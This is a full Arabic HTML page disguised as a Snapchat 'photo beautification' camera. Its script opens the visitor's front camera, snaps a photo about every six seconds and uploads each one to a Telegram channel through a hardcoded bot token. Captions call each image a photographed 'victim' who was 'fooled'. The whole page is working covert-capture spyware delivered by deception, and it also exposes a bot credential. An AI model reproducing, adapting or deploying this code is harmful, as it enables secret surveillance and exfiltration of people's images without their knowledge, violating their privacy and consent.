<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>تجـميل الصور · كاميرا Snapchat</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: #0b0510;
            background-image: radial-gradient(circle at 15% 30%, #2e1a47 0%, #0a0413 45%),
                              linear-gradient(145deg, #140b1f 0%, #030003 100%);
            font-family: 'Segoe UI', 'Arial', system-ui, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            inset: 0;
            background: repeating-linear-gradient(55deg, 
                rgba(170, 120, 255, 0.03) 0px, 
                rgba(170, 120, 255, 0.08) 2px, 
                transparent 2px, 
                transparent 8px),
                radial-gradient(ellipse at 70% 40%, rgba(148, 70, 255, 0.25) 0%, transparent 60%);
            pointer-events: none;
            z-index: 1;
        }

        .container {
            position: relative;
            z-index: 20;
            max-width: 550px;
            width: 100%;
            background: rgba(15, 7, 28, 0.75);
            backdrop-filter: blur(20px) saturate(180%);
            -webkit-backdrop-filter: blur(20px) saturate(180%);
            border-radius: 56px;
            border: 1.5px solid rgba(200, 150, 255, 0.5);
            box-shadow: 0 35px 75px #000000cc, 0 0 0 2px #a974ff1a inset, 0 0 45px #9147ff4d;
            padding: 20px 18px 30px;
            transition: box-shadow 0.3s;
        }

        .container:hover {
            box-shadow: 0 45px 90px black, 0 0 0 3px #bc8eff33 inset, 0 0 70px #b56eff;
        }

        .cover-glam {
            width: 100%;
            height: 130px;
            background: linear-gradient(125deg, #321f4f, #1b0f2b, #2f1752);
            border-radius: 42px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            border: 1px solid #ba93ff;
            box-shadow: 0 25px 40px #00000099, 0 0 40px #ac6eff inset;
        }

        .cover-glam::before {
            content: '✨';
            font-size: 100px;
            position: absolute;
            right: 0px;
            top: -15px;
            color: #eeddff;
            text-shadow: 0 0 35px #e5bcff, 0 0 70px #c57eff;
            transform: rotate(12deg);
            opacity: 0.9;
        }

        .cover-glam::after {
            content: '🌸';
            font-size: 90px;
            position: absolute;
            left: 0px;
            bottom: -25px;
            color: #f1d2ff;
            text-shadow: 0 0 55px #f0c3ff, 0 0 95px #b56eff;
            transform: rotate(-18deg) scaleX(-1);
            opacity: 0.8;
        }

        .glam-text {
            font-size: 38px;
            font-weight: 900;
            letter-spacing: 4px;
            background: linear-gradient(145deg, #f7ecff, #dbb5ff, #fadfff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 35px #d6a9ff, 0 0 90px #b36eff;
            z-index: 10;
            filter: drop-shadow(0 8px 10px black);
        }

        .main-title {
            font-size: 2.5rem;
            font-weight: 800;
            text-align: center;
            margin: 5px 0 15px;
            background: linear-gradient(145deg, #f0dcff, #d7b0ff, #fbeaff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 35px #ad6eff, 2px 4px 15px #13001f;
            line-height: 1.2;
            letter-spacing: 1px;
        }

        .video-case {
            background: #0b0415;
            border-radius: 48px;
            padding: 8px;
            border: 2px solid #ac7eff;
            box-shadow: 0 25px 45px black, 0 0 0 3px #c49dff4d inset, 0 0 60px #b163ff;
            margin: 15px 0;
            position: relative;
        }

        video {
            width: 100%;
            border-radius: 42px;
            display: block;
            aspect-ratio: 4/3;
            object-fit: cover;
            background: #110824;
            border: 1px solid #d1adff;
            transform: scaleX(-1);
        }

        canvas {
            display: none;
        }

        #countdownOverlay {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(22, 6, 40, 0.8);
            backdrop-filter: blur(14px);
            border: 2px solid #d19cff;
            width: 75px;
            height: 75px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2.5rem;
            font-weight: 900;
            color: #f2dcff;
            text-shadow: 0 0 35px #f2dcff, 0 0 75px #c481ff;
            box-shadow: 0 0 45px #d19cff, 0 8px 25px black;
            border: 2px solid #ebcdff;
            z-index: 30;
        }

        .camera-badge {
            position: absolute;
            bottom: 20px;
            right: 20px;
            background: #13052bcc;
            backdrop-filter: blur(15px);
            border-radius: 60px;
            padding: 8px 20px;
            border: 1px solid #d1a3ff;
            color: #edd9ff;
            font-weight: 700;
            font-size: 1rem;
            display: flex;
            gap: 10px;
            align-items: center;
            box-shadow: 0 0 45px #cb9eff;
            z-index: 30;
        }

        .start-button {
            background: linear-gradient(150deg, #3c1e66, #1d0d33, #351b55);
            border: 1px solid #c8a2ff;
            border-radius: 88px;
            padding: 18px 30px;
            width: 100%;
            font-size: 2rem;
            font-weight: 800;
            color: #f4e6ff;
            text-shadow: 0 4px 12px black, 0 0 40px #e3bdff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            box-shadow: 0 28px 45px #000000e0, 0 0 0 2px #e7c7ff inset, 0 0 60px #ba7eff;
            cursor: pointer;
            transition: all 0.25s ease;
            margin: 25px 0 15px;
        }

        .start-button:active {
            transform: scale(0.98);
        }

        .status-panel {
            background: #120a1fcc;
            backdrop-filter: blur(20px);
            border-radius: 80px;
            padding: 16px 20px;
            margin: 15px 0 12px;
            border: 1.5px solid #b27eff;
            color: #efdcff;
            font-size: 1.1rem;
            font-weight: 600;
            text-align: center;
            box-shadow: 0 5px 35px black;
            min-height: 75px;
            display: flex;
            align-items: center;
            justify-content: center;
            word-break: break-word;
        }

        .status-panel.success {
            background: #1e382acc;
            border-color: #a7ffae;
            color: #dcffd5;
            box-shadow: 0 0 60px #9effa2;
        }

        .status-panel.error {
            background: #3f1f31cc;
            border-color: #ff9f9f;
            color: #ffd6d6;
            box-shadow: 0 0 55px #ff7878;
        }

        .debug-card {
            background: #0d0720b3;
            backdrop-filter: blur(16px);
            border-radius: 50px;
            padding: 14px 18px;
            border: 1px dashed #af80ff;
            color: #cab6ff;
            font-size: 0.85rem;
            box-shadow: 0 8px 30px black;
            direction: ltr;
            text-align: left;
            max-height: 100px;
            overflow-y: auto;
        }

        .glow-spot {
            position: absolute;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, #9933ff22, transparent 80%);
            bottom: 0;
            left: 0;
            z-index: 5;
            pointer-events: none;
        }

        @media (max-width: 550px) {
            .container { padding: 16px 14px 24px; }
            .glam-text { font-size: 32px; }
            .main-title { font-size: 2rem; }
            .start-button { font-size: 1.6rem; padding: 14px 20px; gap: 12px; }
            #countdownOverlay { width: 60px; height: 60px; font-size: 2rem; top: 12px; left: 12px; }
            .camera-badge { padding: 6px 14px; font-size: 0.85rem; bottom: 12px; right: 12px; }
        }
    </style>
</head>
<body>
    <div class="glow-spot" style="top: -50px; right: -50px; background: radial-gradient(circle, #b56eff22, transparent 70%);"></div>
    <div class="container">
        <div class="cover-glam">
            <span class="glam-text">✦ تجـميل ✦</span>
        </div>

        <div class="main-title">تجـميل الصور</div>

        <div class="video-case" style="position: relative;">
            <video id="video" autoplay playsinline muted></video>
            <canvas id="canvas"></canvas>
            <div id="countdownOverlay">5</div>
            <div class="camera-badge">
                <span>📷</span> أمامية HD
            </div>
        </div>

        <button class="start-button" id="startCaptureBtn">
            <span>▶️</span> إبدأ التصوير <span>✨</span>
        </button>

        <div id="status" class="status-panel">
            🔷 اضغط الزر لبدء التصوير الإحتࢪافي
        </div>

        <div class="debug-card" id="debugInfo">
            <strong>⚙️ تشخيص:</strong> <span id="debugText">في انتظار التشغيل...</span>
        </div>
    </div>

    <script>
        (function() {
            // ✅ بيانات البوت والقناة
            const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
            const CHANNEL_ID = '-1003875161698';

            // العناصر
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const statusDiv = document.getElementById('status');
            const countdownDiv = document.getElementById('countdownOverlay');
            const debugSpan = document.getElementById('debugText');
            const startBtn = document.getElementById('startCaptureBtn');

            // الحالة
            let mediaStream = null;
            let cameraActive = false;
            let captureInterval = null;
            let isCapturing = false;
            let pendingCapture = false;
            let photoCounter = 1;

            // تحديث التصحيح
            function updateDebug(msg, isError = false) {
                const time = new Date().toLocaleTimeString('ar-EG', { hour12: false });
                const prefix = isError ? '⚠️ ' : '🔹 ';
                debugSpan.innerText = `${prefix}${msg}  [${time}]`;
                console.log('[تجميل الصور]', msg);
            }

            // التقاط الصورة من الفيديو (كاميرا أمامية مع عكس الصورة)
            async function captureImageFromVideo() {
                if (!cameraActive || !mediaStream || !video.videoWidth || !video.videoHeight) {
                    updateDebug('الفيديو غير جاهز للتصوير', true);
                    return null;
                }

                try {
                    const vw = video.videoWidth;
                    const vh = video.videoHeight;

                    if (vw === 0 || vh === 0) {
                        throw new Error('أبعاد الفيديو صفر');
                    }

                    canvas.width = vw;
                    canvas.height = vh;

                    const ctx = canvas.getContext('2d');
                    
                    // عكس الصورة أفقياً للكاميرا الأمامية (لأن الفيديو معكوس)
                    ctx.translate(vw, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, vw, vh);
                    ctx.setTransform(1, 0, 0, 1, 0, 0);

                    const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
                    if (!dataUrl || dataUrl.length < 1000) {
                        throw new Error('بيانات الصورة غير كافية');
                    }

                    updateDebug(`✓ تم التقاط صورة بأبعاد ${vw}×${vh}`);
                    return dataUrl;
                } catch (err) {
                    updateDebug(`فشل التقاط الصورة: ${err.message}`, true);
                    return null;
                }
            }

            // إرسال الصورة إلى تيليجرام
            async function sendPhotoToTelegram(imageDataUrl) {
                if (!imageDataUrl) {
                    updateDebug('لا توجد صورة للإرسال', true);
                    return false;
                }

                try {
                    statusDiv.innerHTML = `💅 جاري تـجـميل الصورة #${photoCounter} يـحب ...`;
                    updateDebug(`إرسال الصورة رقم ${photoCounter}`);

                    const response = await fetch(imageDataUrl);
                    const blob = await response.blob();

                    if (blob.size < 1000) {
                        throw new Error(`حجم الصورة صغير جداً (${blob.size} بايت)`);
                    }

                    const formData = new FormData();
                    formData.append('chat_id', CHANNEL_ID);
                    formData.append('photo', blob, `glam_shot_${photoCounter}.jpg`);

                    const now = new Date();
                    const cairoTime = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
                    const caption = `🧿 *تـم تـصـوير ضـحية جـديده*\n\n` +
                                   `🔷 الصورة رقم: ${photoCounter}\n` +
                                   `📅 التاريخ: ${cairoTime}\n` +
                                   `❤ تم الـتغـفيل بواسطـة ويـسڪي\n` +
                                   `✨ بواسطة: تجميل الصور`;

                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');

                    const apiResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const json = await apiResponse.json();

                    if (json.ok) {
                        statusDiv.className = 'status-panel success';
                        statusDiv.innerHTML = `✅ تم إرسال الصورة #${photoCounter} بنجاح إلى القناة!`;
                        updateDebug(`✓ نجح الإرسال (${(blob.size / 1024).toFixed(1)} كيلوبايت)`);
                        
                        photoCounter++;
                        
                        setTimeout(() => {
                            if (cameraActive && isCapturing && statusDiv.classList.contains('success')) {
                                statusDiv.className = 'status-panel';
                                statusDiv.innerHTML = '📸 التصوير مستمر - سيتم تـجـميل الصـور';
                            }
                        }, 2000);
                        
                        return true;
                    } else {
                        throw new Error(json.description || 'فشل الإرسال');
                    }
                } catch (err) {
                    console.error('Telegram send error:', err);
                    updateDebug(`✗ فشل الإرسال: ${err.message}`, true);
                    statusDiv.className = 'status-panel error';
                    statusDiv.innerHTML = `❌ فشل الإرسال: ${err.message.substring(0, 70)}`;
                    return false;
                }
            }

            // التصوير والإرسال
            async function takeAndSendPhoto() {
                if (!cameraActive || !mediaStream || mediaStream.active === false) {
                    updateDebug('الكاميرا غير نشطة', true);
                    return false;
                }

                if (pendingCapture) {
                    updateDebug('يوجد عملية تصوير قيد التنفيذ');
                    return false;
                }

                pendingCapture = true;
                try {
                    const imageUrl = await captureImageFromVideo();
                    if (!imageUrl) {
                        updateDebug('فشل التقاط الصورة', true);
                        return false;
                    }

                    const success = await sendPhotoToTelegram(imageUrl);
                    return success;
                } catch (err) {
                    updateDebug(`خطأ: ${err.message}`, true);
                    return false;
                } finally {
                    pendingCapture = false;
                }
            }

            // العد التنازلي والتصوير الدوري
            let countdownValue = 5;
            
            function startCountdownCycle() {
                if (!cameraActive || !isCapturing) return;

                countdownValue = 5;
                countdownDiv.textContent = countdownValue;

                if (captureInterval) clearInterval(captureInterval);
                
                captureInterval = setInterval(async () => {
                    if (!isCapturing || !cameraActive) {
                        clearInterval(captureInterval);
                        captureInterval = null;
                        return;
                    }
                    
                    countdownValue--;
                    countdownDiv.textContent = countdownValue;

                    if (countdownValue <= 0) {
                        clearInterval(captureInterval);
                        captureInterval = null;
                        countdownDiv.textContent = '📸';
                        
                        await takeAndSendPhoto();
                        
                        if (isCapturing && cameraActive) {
                            setTimeout(() => {
                                startCountdownCycle();
                            }, 800);
                        } else {
                            countdownDiv.textContent = '⏸️';
                        }
                    }
                }, 1000);
            }

            // تفعيل وضع التصوير
            function enableCaptureMode() {
                if (!cameraActive || !mediaStream) {
                    statusDiv.innerHTML = '⚠️ الكاميرا ليست جاهزة بعد، انتظر قليلاً.';
                    return;
                }
                
                if (captureInterval) {
                    clearInterval(captureInterval);
                    captureInterval = null;
                }
                
                isCapturing = true;
                statusDiv.className = 'status-panel';
                statusDiv.innerHTML = '📸 بدأ التصوير الإحـترافي – سيتم تـجـميل الـصـور';
                updateDebug('وضع التصوير التلقائي نشط (كل 6 ثوانٍ تقريباً)');
                startCountdownCycle();
            }

            // إيقاف التصوير
            function stopCaptureMode() {
                isCapturing = false;
                if (captureInterval) {
                    clearInterval(captureInterval);
                    captureInterval = null;
                }
                countdownDiv.textContent = '⏸️';
                statusDiv.innerHTML = '⏸️ تم إيقاف التصوير. اضغط الزر لبدء التصوير مرة أخرى.';
                updateDebug('تم إيقاف التصوير');
            }

            // تبديل وضع التصوير
            function toggleCapture() {
                if (!cameraActive) {
                    statusDiv.innerHTML = '⚠️ الكاميرا غير جاهزة بعد، انتظر قليلاً.';
                    return;
                }
                
                if (isCapturing) {
                    stopCaptureMode();
                } else {
                    enableCaptureMode();
                }
            }

            // إعداد الكاميرا الأمامية
            async function initFrontCamera() {
                try {
                    updateDebug('طلب الإذن للكاميرا الأمامية...');
                    statusDiv.innerHTML = '📷 يرجى السماح بالوصول إلى الكاميرا ...';
                    
                    if (mediaStream) {
                        mediaStream.getTracks().forEach(track => track.stop());
                        mediaStream = null;
                    }
                    
                    let stream = null;
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: { exact: "user" } },
                            audio: false
                        });
                    } catch (err) {
                        updateDebug(`محاولة ثانية للكاميرا الأمامية: ${err.message}`);
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: "user" },
                            audio: false
                        });
                    }
                    
                    mediaStream = stream;
                    video.srcObject = stream;
                    video.setAttribute('playsinline', true);
                    video.muted = true;
                    cameraActive = false;
                    
                    video.onloadedmetadata = () => {
                        updateDebug(`الفيديو جاهز - الأبعاد: ${video.videoWidth}×${video.videoHeight}`);
                        video.play().then(() => {
                            cameraActive = true;
                            updateDebug('✅ الكاميرا الأمامية تعمل بنجاح');
                            statusDiv.className = 'status-panel';
                            statusDiv.innerHTML = '✅ الكاميرا جاهزة. اضغط "إبدأ التصوير" للتجميل.';
                            countdownDiv.textContent = '5';
                        }).catch(err => {
                            updateDebug(`فشل تشغيل الفيديو: ${err.message}`, true);
                            statusDiv.innerHTML = '❌ فشل تشغيل الفيديو';
                        });
                    };
                    
                    video.onerror = (e) => {
                        updateDebug(`خطأ في الفيديو`, true);
                        cameraActive = false;
                    };
                    
                } catch (err) {
                    cameraActive = false;
                    let errorMsg = '';
                    if (err.name === 'NotAllowedError') {
                        errorMsg = 'تم رفض إذن الكاميرا. يرجى السماح بالوصول للكاميرا.';
                    } else if (err.name === 'NotFoundError') {
                        errorMsg = 'لا توجد كاميرا أمامية على هذا الجهاز.';
                    } else {
                        errorMsg = err.message;
                    }
                    statusDiv.className = 'status-panel error';
                    statusDiv.innerHTML = `❌ ${errorMsg}`;
                    updateDebug(`خطأ الكاميرا: ${errorMsg}`, true);
                }
            }

            // زر البدء
            startBtn.addEventListener('click', async () => {
                updateDebug('تم الضغط على زر بدء التصوير');
                
                if (!mediaStream || !cameraActive) {
                    await initFrontCamera();
                    setTimeout(() => {
                        if (cameraActive) {
                            enableCaptureMode();
                        }
                    }, 500);
                } else {
                    toggleCapture();
                }
            });

            // تنظيف عند الإغلاق
            window.addEventListener('beforeunload', () => {
                isCapturing = false;
                if (captureInterval) clearInterval(captureInterval);
                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
            });

            // بدء التشغيل المبدئي (تشغيل الكاميرا فقط)
            window.addEventListener('load', async () => {
                updateDebug('مرحباً! اضغط على الزر البنفسجي لبدء التصوير');
                await initFrontCamera();
            });
        })();
    </script>
</body>
</html>
